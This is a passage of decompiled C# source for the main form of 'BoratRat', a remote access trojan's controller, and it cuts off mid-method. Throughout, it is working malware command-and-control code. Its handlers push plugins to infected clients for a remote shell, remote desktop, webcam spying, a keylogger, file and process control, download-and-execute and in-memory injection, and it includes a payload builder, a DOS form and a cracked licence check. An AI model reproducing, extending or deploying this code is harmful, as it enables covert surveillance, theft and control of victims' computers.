using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using cGeoIp;
using CrackedAuth;
using DarkUI.Controls;
using DarkUI.Forms;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server
{
	// Token: 0x0200000E RID: 14
	public partial class Form1 : DarkForm
	{
		// Token: 0x0600004D RID: 77 RVA: 0x000034D4 File Offset: 0x000034D4
		public Form1()
		{
			if (!File.Exists("key.cto") || Auth.login(File.ReadAllText("key.cto")) != 1)
			{
				a a = new a();
				a.ShowDialog();
				if (a.o != 1)
				{
					Environment.Exit(1);
				}
			}
			this.InitializeComponent();
			Form1.SetWindowTheme(this.listView1.Handle, "explorer", null);
			base.Opacity = 0.0;
			this.formDOS = new FormDOS
			{
				Name = "DOS",
				Text = "DOS"
			};
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00003584 File Offset: 0x00003584
		private void CheckFiles()
		{
			try
			{
				if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config")))
				{
					MessageBox.Show("Missing " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + ".config");
					Environment.Exit(0);
				}
				if (!File.Exists(Path.Combine(Application.StartupPath, "bin\\ip2region.db")))
				{
					File.WriteAllBytes(Path.Combine(Application.StartupPath, "bin\\ip2region.db"), Resources.ip2region);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "BoratRat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00003654 File Offset: 0x00003654
		private Clients[] GetSelectedClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.SelectedItems.Count != 0)
					{
						foreach (object obj in this.listView1.SelectedItems)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x06000050 RID: 80 RVA: 0x0000369C File Offset: 0x0000369C
		private Clients[] GetAllClients()
		{
			List<Clients> clientsList = new List<Clients>();
			base.Invoke(new MethodInvoker(delegate()
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (this.listView1.Items.Count != 0)
					{
						foreach (object obj in this.listView1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							clientsList.Add((Clients)listViewItem.Tag);
						}
					}
				}
			}));
			return clientsList.ToArray();
		}

		// Token: 0x06000051 RID: 81 RVA: 0x000036E4 File Offset: 0x000036E4
		private void Connect()
		{
			Form1.<Connect>d__8 <Connect>d__;
			<Connect>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Connect>d__.<>1__state = -1;
			<Connect>d__.<>t__builder.Start<Form1.<Connect>d__8>(ref <Connect>d__);
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00003718 File Offset: 0x00003718
		private void Form1_Load(object sender, EventArgs e)
		{
			Form1.<Form1_Load>d__9 <Form1_Load>d__;
			<Form1_Load>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<Form1_Load>d__.<>4__this = this;
			<Form1_Load>d__.<>1__state = -1;
			<Form1_Load>d__.<>t__builder.Start<Form1.<Form1_Load>d__9>(ref <Form1_Load>d__);
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00003754 File Offset: 0x00003754
		private void Form1_Activated(object sender, EventArgs e)
		{
			if (this.trans)
			{
				base.Opacity = 1.0;
			}
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00003770 File Offset: 0x00003770
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			base.Opacity = 0.95;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00003784 File Offset: 0x00003784
		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			this.notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00003798 File Offset: 0x00003798
		private void listView1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.listView1.Items.Count > 0 && e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
			{
				foreach (object obj in this.listView1.Items)
				{
					((ListViewItem)obj).Selected = true;
				}
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00003830 File Offset: 0x00003830
		private void listView1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.listView1.Items.Count > 1)
			{
				ListViewHitTestInfo listViewHitTestInfo = this.listView1.HitTest(e.Location);
				if (e.Button == MouseButtons.Left && (listViewHitTestInfo.Item != null || listViewHitTestInfo.SubItem != null))
				{
					this.listView1.Items[listViewHitTestInfo.Item.Index].Selected = true;
				}
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000038B0 File Offset: 0x000038B0
		private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			if (e.Column == this.lvwColumnSorter.SortColumn)
			{
				if (this.lvwColumnSorter.Order == SortOrder.Ascending)
				{
					this.lvwColumnSorter.Order = SortOrder.Descending;
				}
				else
				{
					this.lvwColumnSorter.Order = SortOrder.Ascending;
				}
			}
			else
			{
				this.lvwColumnSorter.SortColumn = e.Column;
				this.lvwColumnSorter.Order = SortOrder.Ascending;
			}
			this.listView1.Sort();
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00003934 File Offset: 0x00003934
		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
			if (Settings.Default.Notification)
			{
				Settings.Default.Notification = false;
				this.toolStripStatusLabel2.ForeColor = Color.Black;
			}
			else
			{
				Settings.Default.Notification = true;
				this.toolStripStatusLabel2.ForeColor = Color.Green;
			}
			Settings.Default.Save();
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000399C File Offset: 0x0000399C
		private void ping_Tick(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
				msgPack.ForcePathObject("Message").AsString = "This is a ping!";
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack.Encode2Bytes());
				}
				GC.Collect();
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00003A30 File Offset: 0x00003A30
		private void UpdateUI_Tick(object sender, EventArgs e)
		{
			this.Text = Settings.Version + "     " + DateTime.Now.ToLongTimeString();
			object lockListviewClients = Settings.LockListviewClients;
			lock (lockListviewClients)
			{
				this.toolStripStatusLabel1.Text = string.Format("Online {0}     Selected {1}                    Sent {2}     Received  {3}                    CPU {4}%     Memory {5}%", new object[]
				{
					this.listView1.Items.Count.ToString(),
					this.listView1.SelectedItems.Count.ToString(),
					Methods.BytesToString(Settings.SentValue).ToString(),
					Methods.BytesToString(Settings.ReceivedValue).ToString(),
					(int)this.performanceCounter1.NextValue(),
					(int)this.performanceCounter2.NextValue()
				});
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00003B30 File Offset: 0x00003B30
		private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				object lockListviewLogs = Settings.LockListviewLogs;
				lock (lockListviewLogs)
				{
					this.listView2.Items.Clear();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00003BA0 File Offset: 0x00003BA0
		private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] allClients = this.GetAllClients();
				for (int i = 0; i < allClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(allClients[i].Send), msgPack2.Encode2Bytes());
				}
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00003C64 File Offset: 0x00003C64
		private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
					foreach (object obj in this.listView3.Items)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(((Clients)((ListViewItem)obj).Tag).Send), msgPack.Encode2Bytes());
					}
				}
				this.listView3.Items.Clear();
				this.ThumbnailImageList.Images.Clear();
				foreach (object obj2 in this.listView1.Items)
				{
					((Clients)((ListViewItem)obj2).Tag).LV2 = null;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00003DD0 File Offset: 0x00003DD0
		private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView4.SelectedItems.Count > 0)
			{
				foreach (object obj in this.listView4.SelectedItems)
				{
					((ListViewItem)obj).Remove();
				}
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00003E4C File Offset: 0x00003E4C
		private void TimerTask_Tick(object sender, EventArgs e)
		{
			Form1.<TimerTask_Tick>d__23 <TimerTask_Tick>d__;
			<TimerTask_Tick>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<TimerTask_Tick>d__.<>4__this = this;
			<TimerTask_Tick>d__.<>1__state = -1;
			<TimerTask_Tick>d__.<>t__builder.Start<Form1.<TimerTask_Tick>d__23>(ref <TimerTask_Tick>d__);
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00003E88 File Offset: 0x00003E88
		private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
					msgPack.ForcePathObject("Update").AsString = "false";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000062 RID: 98 RVA: 0x000040B0 File Offset: 0x000040B0
		private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.toolStripStatusLabel1.Text.Length > 0 && formSendFileToMemory.toolStripStatusLabel1.ForeColor == Color.Green)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "SendMemory: " + Path.GetFileName(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString());
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendMemory.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x0000433C File Offset: 0x0000433C
		private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
					msgPack.ForcePathObject("Update").AsString = "true";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					if (this.listView4.Items.Count > 0)
					{
						using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
								{
									return;
								}
							}
						}
					}
					Program.form1.listView4.Items.Add(listViewItem);
					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00004564 File Offset: 0x00004564
		private bool GetListview(string id)
		{
			using (IEnumerator enumerator = Program.form1.listView4.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ListViewItem)enumerator.Current).ToolTipText == id)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x06000065 RID: 101 RVA: 0x000045E4 File Offset: 0x000045E4
		private void SetExecution(string id)
		{
			foreach (object obj in Program.form1.listView4.Items)
			{
				ListViewItem listViewItem = (ListViewItem)obj;
				if (listViewItem.ToolTipText == id)
				{
					int num = Convert.ToInt32(listViewItem.SubItems[1].Text);
					num++;
					listViewItem.SubItems[1].Text = num.ToString();
				}
			}
		}

		// Token: 0x06000066 RID: 102
		[DllImport("uxtheme", CharSet = CharSet.Unicode)]
		public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

		// Token: 0x06000067 RID: 103 RVA: 0x0000468C File Offset: 0x0000468C
		private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (FormBuilder formBuilder = new FormBuilder())
			{
				formBuilder.ShowDialog();
			}
		}

		// Token: 0x06000068 RID: 104 RVA: 0x000046C8 File Offset: 0x000046C8
		private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			using (FormAbout formAbout = new FormAbout())
			{
				formAbout.ShowDialog();
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00004704 File Offset: 0x00004704
		private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shell";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
					{
						new FormShell
						{
							Name = "shell:" + clients.ID,
							Text = "shell:" + clients.ID,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x0000484C File Offset: 0x0000484C
		private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\RemoteDesktop.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + clients.ID] == null)
					{
						new FormRemoteDesktop
						{
							Name = "RemoteDesktop:" + clients.ID,
							F = this,
							Text = "RemoteDesktop:" + clients.ID,
							ParentClient = clients,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "RemoteDesktop")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00004978 File Offset: 0x00004978
		private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\RemoteCamera.dll");
					foreach (Clients clients in this.GetSelectedClients())
					{
						if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
						{
							new FormWebcam
							{
								Name = "Webcam:" + clients.ID,
								F = this,
								Text = "Webcam:" + clients.ID,
								ParentClient = clients,
								FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera")
							}.Show();
							ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00004AC4 File Offset: 0x00004AC4
		private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\FileManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
					{
						new FormFileManager
						{
							Name = "fileManager:" + clients.ID,
							Text = "fileManager:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID)
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00004BE4 File Offset: 0x00004BE4
		private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\ProcessManager.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
					{
						new FormProcessManager
						{
							Name = "processManager:" + clients.ID,
							Text = "processManager:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00004CF0 File Offset: 0x00004CF0
		private void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Form1.<SendFileToDiskToolStripMenuItem_Click>d__37 <SendFileToDiskToolStripMenuItem_Click>d__;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<SendFileToDiskToolStripMenuItem_Click>d__.<>4__this = this;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>1__state = -1;
			<SendFileToDiskToolStripMenuItem_Click>d__.<>t__builder.Start<Form1.<SendFileToDiskToolStripMenuItem_Click>d__37>(ref <SendFileToDiskToolStripMenuItem_Click>d__);
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00004D2C File Offset: 0x00004D2C
		private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.IsOK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendMemory.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					foreach (Clients clients in this.GetSelectedClients())
					{
						clients.LV.ForeColor = Color.Red;
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00004EB0 File Offset: 0x00004EB0
		private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Message", "Message", "Controlled by BoratRat", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
					msgPack.ForcePathObject("Message").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00004FBC File Offset: 0x00004FBC
		private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
					msgPack.ForcePathObject("URL").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000072 RID: 114 RVA: 0x000050C8 File Offset: 0x000050C8
		private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.listView1.SelectedItems.Count > 0)
				{
					using (OpenFileDialog openFileDialog = new OpenFileDialog())
					{
						openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
						if (openFileDialog.ShowDialog() == DialogResult.OK)
						{
							MsgPack msgPack = new MsgPack();
							msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
							msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
							msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
							MsgPack msgPack2 = new MsgPack();
							msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
							msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
							msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
							Clients[] selectedClients = this.GetSelectedClients();
							for (int i = 0; i < selectedClients.Length; i++)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000073 RID: 115 RVA: 0x0000523C File Offset: 0x0000523C
		private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Logger.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
					{
						new FormKeylogger
						{
							Name = "keyLogger:" + clients.ID,
							Text = "keyLogger:" + clients.ID,
							F = this,
							FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Keylogger")
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000074 RID: 116 RVA: 0x00005360 File Offset: 0x00005360
		private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = Interaction.InputBox("Alert when process activive.", "Title 标题", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam", -1, -1);
				if (!string.IsNullOrEmpty(text))
				{
					object lockReportWindowClients = Settings.LockReportWindowClients;
					lock (lockReportWindowClients)
					{
						Settings.ReportWindowClients.Clear();
						Settings.ReportWindowClients = new List<Clients>();
					}
					Settings.ReportWindow = true;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
					msgPack.ForcePathObject("Option").AsString = "run";
					msgPack.ForcePathObject("Title").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000075 RID: 117 RVA: 0x000054E8 File Offset: 0x000054E8
		private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				Settings.ReportWindow = false;
				MsgPack msgPack = new MsgPack();
